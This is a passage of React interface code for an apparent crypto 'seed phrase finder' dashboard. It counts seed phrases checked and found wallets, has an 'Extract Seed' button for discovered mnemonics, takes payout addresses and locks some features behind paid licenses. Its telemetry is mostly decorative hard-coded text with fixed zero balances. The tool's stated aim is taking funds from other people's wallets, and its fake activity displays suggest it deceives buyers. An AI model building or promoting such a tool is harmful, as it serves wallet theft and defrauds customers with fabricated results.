              <SidebarGroupLabel className="text-white/30 text-[0.5625rem] uppercase tracking-[0.2em] mb-2">Telemetry</SidebarGroupLabel>
              <SidebarGroupContent className="space-y-6 px-1">
                <div className="space-y-2">
                  <div className="flex items-center justify-between text-[0.625rem] font-code">
                    <span className="text-gray-500 uppercase">Engine Load</span>
                    <span className="text-primary">{cpuLoad.toFixed(1)}%</span>
                  </div>
                  <Progress value={cpuLoad} className="h-1 bg-white/5" />
                </div>

                <div className="grid grid-cols-1 gap-4 pt-2">
                   {[
                     { icon: Zap, label: 'Threads', value: '32 ACTIVE' },
                     { icon: Microchip, label: 'Entropy', value: '256-BIT' },
                     { icon: Shield, label: 'Encryption', value: 'AES-GCM' },
                     { icon: History, label: 'Uptime', value: formatTime(sessionSeconds) }
                   ].map((item, idx) => (
                     <div key={idx} className="flex items-center justify-between text-[0.5625rem] font-code border-b border-white/5 pb-2">
                        <span className="text-gray-500 uppercase flex items-center gap-2"><item.icon className="w-3 h-3" /> {item.label}</span>
                        <span className="text-white font-bold tracking-widest">{item.value}</span>
                     </div>
                   ))}
                </div>
                
                <div className="pt-4 flex items-center gap-3">
                  <div className={cn("w-2.5 h-2.5 rounded-full", isOnline ? (isInterrogating ? "bg-green-500 animate-pulse shadow-[0_0_15px_rgba(34,197,94,0.6)]" : "bg-blue-500 shadow-[0_0_15px_rgba(59,130,246,0.6)]") : "bg-red-500 animate-pulse shadow-[0_0_15px_rgba(239,68,68,0.3)]")} />
                  <span className="text-[0.625rem] font-bold uppercase tracking-widest text-gray-400">
                    {!isOnline ? "Offline" : isInterrogating ? "Scanning" : "Standby"}
                  </span>
                </div>
              </SidebarGroupContent>
            </SidebarGroup>
          </SidebarContent>

          <SidebarFooter className="p-4 border-t border-white/5 shrink-0">
            <Button variant="ghost" onClick={handleLogout} className="w-full justify-start text-gray-500 hover:text-red-500 hover:bg-red-500/10 h-10 px-4 transition-colors">
              <LogOut className="w-4 h-4 mr-3" />
              <span className="text-[0.625rem] font-bold uppercase tracking-widest">Terminate</span>
            </Button>
          </SidebarFooter>
        </Sidebar>

        <main className="flex-1 flex flex-col min-w-0 bg-transparent relative z-10">
          <header className="h-16 border-b border-white/5 bg-black/40 backdrop-blur-xl flex items-center justify-between px-8 z-20 shrink-0">
            <div className="flex items-center gap-8">
               <div className="flex items-center gap-3">
                 <Activity className={cn("w-4 h-4", isInterrogating ? "text-primary animate-pulse" : "text-gray-700")} />
                 <span className="text-[0.625rem] font-black uppercase tracking-[0.2em] text-gray-500">System Status</span>
                 <span className={cn("text-[0.625rem] font-black uppercase tracking-[0.2em]", !isOnline ? "text-red-500" : isInterrogating ? "text-primary" : "text-gray-700")}>
                   {!isOnline ? "Disconnected" : isInterrogating ? "Active" : "Ready"}
                 </span>
               </div>
            </div>
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-2 mr-6">
                {isOnline ? <Wifi className="w-4 h-4 text-green-500" /> : <WifiOff className="w-4 h-4 text-red-500" />}
                <span className={cn("text-[0.5625rem] font-bold uppercase tracking-widest", isOnline ? "text-green-500/60" : "text-red-500")}>
                  {isOnline ? "Network Live" : "Network Error"}
                </span>
              </div>
              <div className="flex flex-col items-end">
                <span className="text-[0.5625rem] font-code text-gray-600 uppercase">System Time</span>
                <span className="text-[0.75rem] font-code text-white/80">{systemTime || "00:00:00"}</span>
              </div>
            </div>
          </header>

          <div className="flex-1 overflow-y-auto p-4 md:p-8 flex flex-col no-scrollbar min-h-0">
            <div className="max-w-[1400px] mx-auto w-full flex-1 flex flex-col min-h-0 animate-in fade-in duration-700">
              
              {!isOnline && (
                <div className="absolute inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-8 animate-in fade-in zoom-in-95 duration-500">
                  <div className="max-w-md w-full glass-panel rounded-3xl p-10 border-red-500/20 text-center space-y-6 shadow-glow-destructive">
                    <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto border border-red-500/30">
                      <WifiOff className="w-10 h-10 text-red-500 animate-pulse" />
                    </div>
                    <div className="space-y-2">
                      <h2 className="text-[1.25rem] font-black text-white uppercase tracking-[0.2em]">Connection Severed</h2>
                      <p className="text-[0.6875rem] text-gray-500 uppercase leading-relaxed font-bold tracking-widest">
                        Neural uplink to blockchain nodes has been lost. <br />
                        All forensic operations have been suspended to prevent data corruption.
                      </p>
                    </div>
                    <div className="flex items-center justify-center gap-3 py-4 border-t border-white/5">
                      <RefreshCw className="w-4 h-4 text-primary animate-spin" />
                      <span className="text-[0.625rem] font-bold text-primary uppercase tracking-[0.2em]">Monitoring for reconnection...</span>
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'dashboard' && (
                <div className="grid grid-cols-1 xl:grid-cols-4 gap-8 flex-1 min-h-0 animate-in slide-in-from-bottom-4 duration-700">
                  <div className="xl:col-span-1 flex flex-col gap-6 min-h-0">
                    <section className="space-y-4 shrink-0">
                      <div className="flex items-center justify-between px-1">
                        <h2 className="text-[0.625rem] font-black uppercase tracking-[0.2em] text-white/40">Blockchains</h2>
                        <span className="text-[0.5625rem] font-code text-primary/60">{activeBlockchains.length} Selected</span>
                      </div>
                      <div className="blockchain-grid">
                        {BLOCKCHAINS.map((chain) => {
                          const isActive = activeBlockchains.includes(chain.id)
                          const isMulticoinActive = activeBlockchains.includes('multicoin')
                          const isLockedByMulticoin = isMulticoinActive && chain.id !== 'multicoin'
                          
                          if (chain.id === 'multicoin') {
                            const isMulticoinLocked = !licenseData?.allowedChains?.includes('multicoin');
                            return (
                              <div 
                                key={chain.id} 
                                onClick={() => toggleBlockchain(chain.id)} 
                                className={cn(
                                  "blockchain-card col-span-2 group relative overflow-hidden h-16 cursor-pointer transition-all duration-500", 
                                  isActive ? "bg-primary/20 border-primary/40 shadow-[0_0_30px_rgba(173,79,230,0.4)]" : "glass-panel border-white/10 hover:border-primary/40 hover:scale-[1.02]", 
                                  (isInterrogating || !isOnline) && "cursor-not-allowed pointer-events-none opacity-50",
                                  isMulticoinLocked && "opacity-60 grayscale-[0.5]"
                                )}
                              >
                                <div className="absolute inset-0 bg-gradient-to-r from-primary/10 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity" />
                                <div className="relative z-10 flex items-center gap-4 w-full px-5 h-full">
                                  <div className={cn("w-10 h-10 rounded-xl flex items-center justify-center transition-all shadow-inner border", isActive ? "bg-primary text-black border-primary" : "bg-white/5 text-primary border-white/10")}>
                                    {isMulticoinLocked ? <Lock className="w-5 h-5" /> : <Layers className="w-5 h-5" />}
                                  </div>
                                  <div className="flex flex-col flex-1">
                                    <div className="flex items-center justify-between">
                                      <span className="text-[0.6875rem] font-black uppercase tracking-[0.2em] text-white">{chain.name}</span>
                                      <div className="flex items-center gap-2">
                                        <span className={cn(
                                          "text-[0.4375rem] font-black px-2 py-0.5 rounded-sm border uppercase tracking-tighter shadow-[0_0_10px_rgba(173,79,230,0.5)]",
                                          isMulticoinLocked ? "bg-gray-800 text-gray-400 border-gray-700" : "bg-primary text-black border-primary/30 animate-pulse"
                                        )}>
                                          {isMulticoinLocked ? "LICENSE REQUIRED" : "ELITE MODULE"}
                                        </span>
                                        {!isMulticoinLocked && <ChevronRight className={cn("w-3 h-3 transition-all", isActive ? "text-primary translate-x-0" : "text-gray-700 -translate-x-2 opacity-0 group-hover:opacity-100 group-hover:translate-x-0")} />}
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            )
                          }

                          return (
                            <div 
                              key={chain.id} 
                              onClick={() => toggleBlockchain(chain.id)} 
                              className={cn(
                                "blockchain-card group relative overflow-hidden transition-all duration-300", 
                                isActive && "active", 
                                (isInterrogating || !isOnline || isLockedByMulticoin) && "cursor-not-allowed pointer-events-none opacity-50",
                                !isActive && "hover:scale-[1.05]"
                              )}
                            >
                              {chain.logo ? (
                                <img src={chain.logo} alt={`${chain.name} logo`} className="w-6 h-6 object-contain" />
                              ) : (
                                <div className="w-6 h-6 flex items-center justify-center text-primary"><Coins className="w-5 h-5" /></div>
                              )}
                              <div className="flex flex-col">
                                <span className="leading-none text-[0.625rem] font-bold uppercase">{chain.name}</span>
                              </div>
                              {isLockedByMulticoin && (
                                <div className="absolute inset-0 bg-black/40 flex items-center justify-center z-10 transition-opacity">
                                  <ShieldCheck className="w-4 h-4 text-primary/60" />
                                </div>
                              )}
                            </div>
                          )
                        })}
                      </div>
                    </section>

                    <div className={cn("flex-1 glass-panel rounded-2xl p-6 flex flex-col justify-start overflow-hidden min-h-0 transition-all duration-700", isInterrogating ? "shadow-volumetric-intense" : "shadow-volumetric")}>
                      <div className="space-y-6">
                        <div className="space-y-1">
                          <p className="text-[0.625rem] font-bold text-gray-500 uppercase tracking-widest flex items-center gap-2">
                            <Zap className="w-3 h-3" /> Seed phrases checked
                          </p>
                          <p className="seed-counter font-code tracking-tighter transition-all duration-700">
                            {displayCount.toLocaleString()}
                          </p>
                        </div>
                        <div className="space-y-4">
                          <div className="grid grid-cols-2 gap-4">
                            <div className="space-y-1">
                              <p className="text-[0.625rem] font-bold text-gray-500 uppercase tracking-widest flex items-center gap-2">
                                <Timer className="w-3 h-3" /> Session time
                              </p>
                              <p className="text-[1.5rem] font-black font-code text-primary tracking-tighter">
                                {formatTime(sessionSeconds)}
                              </p>
                            </div>
                            <div className="space-y-1 border-l border-white/5 pl-4">
                              <p className="text-[0.625rem] font-bold text-gray-500 uppercase tracking-widest flex items-center gap-2">
                                <WalletIcon className="w-3 h-3" /> Found
                              </p>
                              <p className="text-[1.5rem] font-black font-code text-green-400 tracking-tighter">
                                {foundWallets}
                              </p>
                            </div>
                          </div>
                          <div className="grid grid-cols-2 gap-4 pt-2 border-t border-white/5">
                            <div className="space-y-1">
                              <p className="text-[0.625rem] font-bold text-gray-500 uppercase tracking-widest flex items-center gap-2">
                                <Signal className="w-3 h-3" /> Latency
                              </p>
                              <p className={cn("text-[1.125rem] font-black font-code tracking-tighter transition-all", isOnline ? "text-cyan-400" : "text-red-500")}>
                                {isOnline ? `${networkPing.toFixed(1)} ms` : "0 ms"}
                              </p>
                            </div>
                            <div className="space-y-1 border-l border-white/5 pl-4">
                              <p className="text-[0.625rem] font-bold text-gray-500 uppercase tracking-widest flex items-center gap-2">
                                <Rocket className="w-3 h-3" /> Booster
                              </p>
                              <p className="text-[1.125rem] font-black font-code text-primary tracking-tighter">
                                {boosterCount} UNITS
                              </p>
                            </div>
                          </div>
                        </div>

                        <div className="space-y-3 mt-4">
                          <Button 
                            onClick={activateBooster}
                            disabled={!isInterrogating || isBoosterActive || boosterCount <= 0}
                            className={cn(
                              "w-full h-14 font-black text-[0.6875rem] uppercase tracking-[0.2em] transition-all rounded-xl border relative overflow-hidden group shadow-glow duration-700",
                              isBoosterActive 
                                ? "bg-primary/20 text-primary border-primary/40 cursor-default" 
                                : "bg-gradient-to-r from-primary via-accent to-primary bg-[length:200%_auto] animate-gradient text-white border-primary/40 hover:scale-[1.03] active:scale-95 shadow-[0_12px_40px_rgba(173,79,230,0.4)]"
                            )}
                          >
                            <Rocket className={cn("w-4 h-4 mr-3 transition-transform duration-700", isBoosterActive && "animate-bounce")} />
                            {isBoosterActive ? "Booster Active" : "Activate Booster"}
                          </Button>
                          
                          {isBoosterActive && (
                            <div className="flex items-center justify-center gap-2 py-1 animate-in fade-in slide-in-from-top-2 duration-500">
                              <Timer className="w-3 h-3 text-primary animate-pulse" />
                              <span className="text-[0.625rem] font-code font-bold text-primary tracking-[0.2em]">
                                TIME REMAINING: {formatTime(boosterTimeRemaining).slice(3)}
                              </span>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="xl:col-span-2 flex flex-col min-h-0">
                    <div className="flex items-center justify-between mb-4 shrink-0 px-1">
                      <div className="flex items-center gap-3">
                        <SearchCode className="w-4 h-4 text-primary" />
                        <h3 className="text-[0.6875rem] font-black uppercase tracking-[0.2em] text-white/60">Scan Console</h3>
                      </div>
                    </div>
                    
                    <div className={cn("scan-wrapper flex-1 min-h-0 shadow-[0_0_80px_rgba(0,0,0,0.7)] rounded-xl transition-all duration-1000", isBoosterActive && "scale-[1.01]")}>
                      <div className="h-full scan-console no-scrollbar flex flex-col relative rounded-xl overflow-hidden bg-black/80 backdrop-blur-sm">
                        <div className="absolute inset-0 scanline opacity-30 z-20 pointer-events-none" />
                        {isBoosterActive && <div className="absolute inset-0 bg-primary/5 animate-pulse z-10 pointer-events-none" />}
                        <div 
                          ref={scrollRef} 
                          className="flex-1 overflow-y-auto no-scrollbar p-6 space-y-2 z-10 flex flex-col scroll-smooth"
                          style={{ fontSize: `${consoleFontSize[0] / 16}rem` }}
                        >
                          {logs.map((log) => (
                            <div key={log.id} className="console-line">
                              {log.type === 'ai' ? (
                                <div className="flex items-center gap-1 font-code">
                                  <span className="balance">Balance: 0</span>
                                  <span className="text-gray-600 px-1 opacity-50">|</span>
                                  <span className="text-[#dcdcdc] shrink-0">Wallet check:</span>
                                  <span className={cn("ml-1 transition-colors duration-500", seedPhraseColor)}>
                                    {log.message}
                                  </span>
                                </div>
                              ) : log.type === 'success' ? (
                                <div className="flex flex-col gap-2 font-code text-green-400 bg-green-500/10 p-4 rounded border border-green-500/20 shadow-[0_0_40px_rgba(34,197,94,0.4)] animate-in zoom-in-95 duration-500">
                                  <div className="flex justify-between items-center border-b border-green-500/20 pb-2 mb-1">
                                    <span className="text-[0.625rem] font-black tracking-widest uppercase">Forensic Hit Detected</span>
                                    <span className="text-white/30 text-[0.5625rem]">[{log.timestamp}]</span>
                                  </div>
                                  <span className="text-[0.75rem] font-black leading-relaxed whitespace-pre-wrap">
                                    {log.message}
                                  </span>
                                </div>
                              ) : (
                                <div className="flex gap-4 font-code text-[#8df7b1] opacity-80 hover:opacity-100 transition-opacity">
                                  <span className="text-white/10 shrink-0 select-none">[{log.timestamp}]</span>
                                  <span className="uppercase tracking-tight font-bold">
                                    {log.message}
                                  </span>
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                        {isInterrogating && (
                          <div className="absolute bottom-0 left-0 right-0 z-20 pointer-events-none h-32 overflow-hidden animate-in fade-in duration-700">
                             <div className="absolute inset-0 bg-gradient-to-t from-primary/80 via-primary/30 to-transparent animate-pulse-glow" />
                             {/* Premium Rising Particles */}
                             {RISING_PARTICLES.map((p, i) => (
                               <div 
                                 key={i}
                                 className="absolute bottom-0 bg-primary rounded-full blur-[1px] animate-particle-rise"
                                 style={{
                                   left: p.left,
                                   width: p.size,
                                   height: p.size,
                                   animationDelay: p.delay,
                                   animationDuration: p.duration,
                                   opacity: 0
                                 }}
                               />
                             ))}
                             <div className="absolute bottom-0 left-0 right-0 h-[2.5px] bg-primary shadow-[0_0_45px_rgba(173,79,230,1)]" />
                          </div>
                        )}
                      </div>
                    </div>
                  </div>

                  <div className="xl:col-span-1 flex flex-col gap-6 min-h-0">
                    <div className="flex items-center gap-2 mb-1 shrink-0 px-1">
                      <BrainCircuit className="w-4 h-4 text-primary" />
                      <h3 className="text-[0.6875rem] font-black uppercase tracking-[0.2em] text-white/60">AI Search</h3>
                    </div>
                    <div className="flex-1 glass-panel rounded-2xl p-6 flex flex-col min-h-0 overflow-hidden shadow-[0_30px_60px_rgba(0,0,0,0.5)] relative hover:border-primary/30 transition-all duration-700">
                       {isBoosterActive && (
                         <div className="absolute top-0 right-0 p-3 z-20">
                            <div className="flex items-center gap-2 bg-primary/20 border border-primary/40 px-3 py-1 rounded-full animate-pulse shadow-glow">
                               <Rocket className="w-3 h-3 text-primary" />
                               <span className="text-[0.5625rem] font-code text-white font-bold">{formatTime(boosterTimeRemaining).slice(3)}</span>
                            </div>
                         </div>
                       )}

                       {!isAiSearchConnected ? (
                         <div className="flex-1 flex flex-col items-center justify-center text-center p-4">
                           <div className="relative mb-8 group">
                             <svg viewBox="0 0 100 100" className={cn("w-20 h-20 transition-all duration-1000", isAiSearchConnecting ? "text-primary scale-110" : "text-gray-800")}>
                               <circle cx="50" cy="50" r="45" fill="none" stroke="currentColor" strokeWidth="0.5" strokeDasharray="10 5" className={cn("animate-smooth-spin", isBoosterActive && "animate-spin-fast")} />
                               <circle cx="50" cy="50" r="35" fill="none" stroke="currentColor" strokeWidth="1" strokeDasharray="5 15" className={cn("animate-reverse-spin", isBoosterActive && "animate-reverse-spin-fast")} />
                               <path d="M50 20 L50 80 M20 50 L80 50" stroke="currentColor" strokeWidth="0.5" opacity="0.3" />
                               <circle cx="50" cy="50" r="15" className={cn("fill-primary/20 animate-pulse-glow", isBoosterActive && "fill-primary/40")} />
                             </svg>
                             {isAiSearchConnecting && <div className="absolute inset-0 rounded-full pulse-ring border border-primary/40" />}
                           </div>
                           <h4 className="text-[0.625rem] font-bold text-white uppercase tracking-widest mb-2">
                             {isAiSearchConnecting ? "Negotiating Uplink" : "AI Search Standby"}
                           </h4>
                           <Button 
                             onClick={connectAiSearch} 
                             disabled={isAiSearchConnecting}
                             className={cn(
                               "w-full font-black text-[0.6875rem] uppercase tracking-[0.2em] transition-all duration-500 rounded-xl border relative overflow-hidden h-12 mt-6 shadow-glow",
                               licenseData?.aiSearchEnabled && !isAiSearchConnecting
                                 ? "bg-gradient-to-r from-primary via-accent to-primary bg-[length:200%_auto] animate-gradient text-white border-primary/40 hover:scale-[1.03]"
                                 : "bg-primary/10 border-primary/20 text-primary hover:bg-primary/20"
                             )}
                           >
                             {isAiSearchConnecting && <Loader2 className="w-3 h-3 mr-2 animate-spin" />}
                             {!isAiSearchConnecting && (licenseData?.aiSearchEnabled ? <Zap className="w-3 h-3 mr-2" /> : <Lock className="w-3 h-3 mr-2" />)}
                             {isAiSearchConnecting ? "Connecting..." : licenseData?.aiSearchEnabled ? "Enable AI Search" : "License Required"}
                           </Button>
                           {!licenseData?.aiSearchEnabled && (
                             <p className="mt-4 text-[0.5625rem] text-red-500 uppercase font-black tracking-widest leading-relaxed animate-pulse">
                               Neural Search Locked: Enterprise Tier License Required
                             </p>
                           )}
                           {aiSearchLogs.length > 0 && (
                             <div className="mt-8 w-full text-left font-code text-[0.5625rem] space-y-1.5 border-t border-white/5 pt-6 animate-in fade-in duration-500">
                               {aiSearchLogs.map((l, i) => (
                                 <div key={i} className="text-primary/60 animate-in slide-in-from-left-2 duration-300">
                                   &gt; {l}
                                 </div>
                               ))}
                             </div>
                           )}
                         </div>
                       ) : (
                         <div className="flex flex-col h-full space-y-4 animate-in fade-in zoom-in-95 duration-700">
                            <div className="flex items-center gap-3 p-2 shrink-0 border-b border-white/5 pb-4">
                               <div className="relative shrink-0">
                                 <svg viewBox="0 0 100 100" className={cn("w-10 h-10 text-primary transition-all duration-700", isInterrogating && "animate-pulse")}>
                                    <circle cx="50" cy="50" r="45" fill="none" stroke="currentColor" strokeWidth="1" strokeDasharray="10 5" className={cn("animate-smooth-spin", isBoosterActive && "animate-spin-fast")} />
                                    <circle cx="50" cy="50" r="15" className="fill-primary animate-pulse" />
                                 </svg>
                                 <div className="absolute inset-0 rounded-full pulse-ring border border-primary/40" />
                               </div>
                               <div className="flex flex-col">
                                 <span className="text-[0.625rem] font-black text-white uppercase tracking-widest leading-none">Neural Link</span>
                                 <span className="text-[0.5rem] font-bold text-primary uppercase tracking-widest mt-1">Status: Operational</span>
                               </div>
                            </div>

                            <div className="grid grid-cols-2 gap-3 shrink-0">
                              {[
                                { label: 'Pattern Depth', value: isBoosterActive ? '24-BIT SYNC' : '12-BIT SYNC' },
                                { label: 'Heuristic Load', value: isInterrogating ? (isBoosterActive ? '98.8%' : '82.4%') : '0.0%' },
                                { label: 'Entropy Sync', value: 'MASTERED' },
                                { label: 'AI Threads', value: isBoosterActive ? '64 ACTIVE' : '16 ACTIVE' }
                              ].map((item, idx) => (
                                <div key={idx} className="p-3 rounded-xl bg-white/[0.02] border border-white/5 flex flex-col gap-1 transition-all duration-500 hover:border-primary/50 hover:bg-white/[0.04]">
                                  <span className="text-[0.5rem] text-gray-600 uppercase font-black tracking-widest">{item.label}</span>
                                  <span className="text-[0.625rem] font-code text-primary font-bold">{item.value}</span>
                                </div>
                              ))}
                            </div>

                            <div className="flex-1 flex flex-col min-h-0 overflow-hidden bg-black/60 border border-white/5 rounded-xl shadow-inner relative transition-all duration-700">
                              <div className="absolute inset-0 scanline opacity-30 z-20 pointer-events-none" />
                              <div className="px-3 py-2 border-b border-white/10 bg-white/[0.03] flex items-center justify-between shrink-0">
                                <div className="flex items-center gap-2">
                                  <Terminal className="w-3 h-3 text-primary/70" />
                                  <span className="text-[0.5625rem] font-black text-white/60 uppercase tracking-widest">Neural Terminal</span>
                                </div>
                              </div>
                              <div 
                                ref={aiTerminalScrollRef}
                                className="flex-1 overflow-y-auto p-4 space-y-2 no-scrollbar font-code text-[0.5625rem] scroll-smooth"
                              >
                                {aiTerminalLogs.length === 0 ? (
                                  <div className="text-gray-700 uppercase animate-pulse italic text-[0.5rem] tracking-widest py-6 text-center">
                                    {isInterrogating ? "CALIBRATING AI FEED..." : "AWAITING ENGINE SCAN..."}
                                  </div>
                                ) : (
                                  aiTerminalLogs.map((log) => (
                                    <div key={log.id} className="leading-normal border-b border-white/[0.02] pb-1.5 animate-in slide-in-from-left-2 duration-300">
                                      <span className="text-primary/30 mr-2 tabular-nums">[{log.timestamp}]</span>
                                      <span className={cn(
                                        "text-white/70",
                                        log.message.includes('[ALERT]') && "text-yellow-400/90 font-bold",
                                        log.message.includes('[MATCH]') && "text-primary/90 font-black tracking-tight",
                                        log.message.includes('[HEURISTIC]') && "text-cyan-400/80 font-bold"
                                      )}>
                                        {log.message}
                                      </span>
                                    </div>
                                  ))
                                )}
                              </div>
                            </div>

                            <Button 
                              onClick={disconnectAiSearch} 
                              disabled={isInterrogating} 
                              variant="outline" 
                              className="w-full shrink-0 mt-auto border-red-500/30 text-red-500/70 hover:text-red-500 hover:bg-red-500/10 font-black text-[0.6875rem] uppercase tracking-[0.1em] transition-all duration-500 h-11 hover:scale-[1.03] active:scale-95 group/disc"
                            >
                               <Unplug className="w-4 h-4 mr-2" /> 
                               Disconnect Link
                            </Button>
                         </div>
                       )}
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'withdraw' && (
                <div className="flex-1 flex flex-col gap-8 min-h-0 animate-in slide-in-from-bottom-4 duration-700">
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-8 shrink-0">
                    <div className="glass-panel p-10 rounded-3xl border-primary/30 bg-primary/[0.02] relative overflow-hidden group shadow-[0_25px_50px_rgba(0,0,0,0.6)] transition-all duration-1000">
                      <div className="absolute top-0 right-0 p-6 opacity-10 group-hover:opacity-25 transition-all duration-1000">
                         <Zap className="w-24 h-24 text-primary" />
                      </div>
                      <div className="relative z-10">
                        <div className="flex items-center gap-3 mb-6">
                          <div className="p-3 rounded-xl bg-primary/10 border border-primary/20">
                            <Activity className="w-5 h-5 text-primary" />
                          </div>
                          <h4 className="text-[0.6875rem] font-black uppercase tracking-[0.2em] text-gray-400">Total Forensic Yield</h4>
                        </div>
                        <p className="text-[3.75rem] font-black font-code text-white tracking-tighter drop-shadow-[0_0_25px_rgba(173,79,230,0.5)]">
                          $0.00
                        </p>
                      </div>
                    </div>

                    <div className="md:col-span-2 glass-panel p-10 rounded-3xl border-white/5 flex items-center justify-between shadow-[0_25px_50px_rgba(0,0,0,0.4)] hover:border-primary/20 transition-all duration-700">
                       <div className="space-y-6">
                          <h4 className="text-gray-500 text-[0.625rem] font-black uppercase tracking-[0.2em]">Uplink Status</h4>
                          <div className="flex items-center gap-10">
                             {[
                               { label: 'Protocol', value: 'AES-256 SECURE' },
                               { label: 'Node', value: selectedServer?.name },
                               { label: 'Discovery Cycle', value: isInterrogating ? "ONGOING" : "STANDBY", colorClass: isInterrogating ? "text-primary" : "text-gray-500" }
                             ].map((item, idx) => (
                               <div key={idx} className={cn("flex flex-col gap-2 transition-all duration-500", idx > 0 && "border-l border-white/10 pl-10")}>
                                  <span className="text-[0.5625rem] font-code text-primary/60 uppercase">{item.label}</span>
                                  <span className={cn("text-[0.875rem] font-bold uppercase tracking-wide transition-all", item.colorClass || "text-white")}>{item.value}</span>
                               </div>
                             ))}
                          </div>
                       </div>
                       
                       <Dialog>
                         <DialogTrigger asChild>
                            <Button disabled={!isOnline} className="bg-primary/10 border border-primary/20 text-primary hover:bg-primary/20 h-14 px-10 rounded-2xl font-black text-[0.6875rem] uppercase tracking-widest transition-all duration-500 shadow-[0_8px_20px_rgba(173,79,230,0.2)] hover:scale-105 active:scale-95">
                              <CreditCard className="w-5 h-5 mr-3" />
                              Configure Payout Nodes
                            </Button>
                         </DialogTrigger>
                         <DialogContent className="bg-[#0a0a0f] border-white/10 text-white max-w-md rounded-3xl animate-in zoom-in-95 duration-500">
                           <DialogHeader>
                             <DialogTitle className="text-xl font-black uppercase tracking-widest flex items-center gap-4">
                               <ShieldCheck className="w-7 h-7 text-primary" />
                               Payout Nodes
                             </DialogTitle>
                           </DialogHeader>
                           <div className="space-y-6 py-8">
                             {['Bitcoin (BTC) Address', 'Tether USDT (BEP-20)', 'Solana (SOL)'].map((label, i) => (
                               <div key={i} className="space-y-3">
                                 <label className="text-[0.625rem] font-bold text-gray-500 uppercase tracking-widest">{label}</label>
                                 <Input 
                                   value={i === 0 ? payoutBtc : i === 1 ? payoutUsdt : payoutSol} 
                                   onChange={(e) => i === 0 ? setPayoutBtc(e.target.value) : i === 1 ? setPayoutUsdt(e.target.value) : setPayoutSol(e.target.value)}
                                   placeholder={`Enter ${label.split(' ')[0]} address...`}
                                   className="bg-white/[0.02] border-white/5 h-14 rounded-xl font-code text-xs focus:ring-primary/20 focus:border-primary/50 transition-all"
                                 />
                               </div>
                             ))}
                           </div>
                           <DialogFooter>
                             <Button disabled={isSavingPayout} onClick={handleSavePayoutAddresses} className="w-full h-14 rounded-2xl bg-primary text-black font-black uppercase text-[0.6875rem] tracking-widest shadow-glow hover:scale-[1.03] transition-all duration-500">
                               {isSavingPayout ? <Loader2 className="w-5 h-5 mr-3 animate-spin" /> : <Save className="w-5 h-5 mr-3" />}
                               {isSavingPayout ? "Synchronizing HQ..." : "Save Payout Configuration"}
                             </Button>
                           </DialogFooter>
                         </DialogContent>
                       </Dialog>
                    </div>
                  </div>

                  <div className="flex-1 glass-panel rounded-[32px] p-10 border-white/5 flex flex-col overflow-hidden shadow-[0_40px_80px_rgba(0,0,0,0.7)] hover:border-primary/10 transition-all duration-1000">
                    <div className="flex items-center justify-between mb-10 shrink-0">
                      <div className="flex items-center gap-4">
                        <Dna className="w-6 h-6 text-primary animate-pulse" />
                        <h3 className="text-[0.875rem] font-black uppercase tracking-[0.3em] text-white/80">Discovered Neural Ledger</h3>
                      </div>
                      <span className="text-[0.625rem] font-code text-primary/60 uppercase tracking-widest">Found Assets: {discoveredAssets.length}</span>
                    </div>
                    
                    <div className="flex-1 overflow-y-auto no-scrollbar pr-6 pb-12 scroll-smooth">
                      {discoveredAssets.length === 0 ? (
                        <div className="h-full flex flex-col items-center justify-center opacity-20 py-24 animate-in fade-in duration-1000">
                          <Activity className="w-24 h-24 mb-8" />
                          <div className="text-center space-y-3">
                            <p className="text-base uppercase tracking-[0.5em] font-black text-white">Neural Web Silent</p>
                            <p className="text-[0.6875rem] uppercase tracking-widest text-gray-500">Awaiting forensic asset discovery</p>
                          </div>
                        </div>
                      ) : (
                        <div className="space-y-6">
                          {discoveredAssets.map((asset) => (
                            <div key={asset.id} className="p-8 rounded-3xl bg-white/[0.02] border border-white/5 flex items-center justify-between group hover:bg-white/[0.06] hover:border-primary/30 transition-all duration-500 animate-in slide-in-from-right-4">
                              <div className="flex items-center gap-8">
                                <div className="w-14 h-14 rounded-2xl bg-green-500/10 border border-green-500/20 flex items-center justify-center transition-all duration-500 group-hover:bg-green-500/20 group-hover:scale-110">
                                  <WalletIcon className="w-7 h-7 text-green-500" />
                                </div>
                                <div className="space-y-2">
                                  <div className="flex items-center gap-3">
                                    <span className="text-[0.6875rem] font-black text-white uppercase tracking-widest">{asset.network}</span>
                                    <span className="w-1.5 h-1.5 rounded-full bg-gray-700" />
                                    <span className="text-[0.625rem] font-code text-gray-500">{asset.timestamp}</span>
                                  </div>
                                  <p className="text-[1.5rem] font-black text-green-400 font-code tracking-tighter">{asset.value}</p>
                                  <div className="flex items-center gap-3">
                                    <span className="text-gray-600 font-black uppercase text-[0.5625rem] tracking-widest">Signature: </span>
                                    <span className="text-primary/60 font-code text-[0.5625rem] tracking-tight">{asset.mnemonic.slice(0, 45)}...</span>
                                  </div>
                                </div>
                              </div>
                              <div className="flex items-center gap-4">
                                <Button 
                                  variant="outline" 
                                  onClick={() => handleCopyMnemonic(asset.mnemonic)}
                                  className="h-12 px-8 rounded-2xl border-primary/20 text-primary hover:bg-primary/10 font-black text-[0.625rem] uppercase tracking-widest group/btn transition-all duration-500 hover:scale-105 shadow-sm active:scale-95"
                                >
                                  <Copy className="w-4 h-4 mr-3" />
                                  Extract Seed
                                </Button>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'server' && (
                <div className="flex-1 grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-12 overflow-hidden pb-10 md:pb-0 animate-in slide-in-from-bottom-4 duration-700">
                  <div className="lg:col-span-4 flex flex-col gap-8 min-h-0 overflow-y-auto no-scrollbar px-1 pr-3 pb-20">
                    <div className="flex items-center justify-between mb-2 sticky top-0 bg-[#050507]/90 backdrop-blur-md py-4 z-20">
                      <div className="flex items-center gap-3 px-2">
                        <Network className="w-5 h-5 text-primary" />
                        <h3 className="text-[0.6875rem] font-black uppercase tracking-[0.2em] text-white">Network Cluster</h3>
                      </div>
                    </div>
                    
                    <div className="space-y-6 px-1">
                      {SERVERS.map((server) => {
                        const isSelected = selectedServerId === server.id;
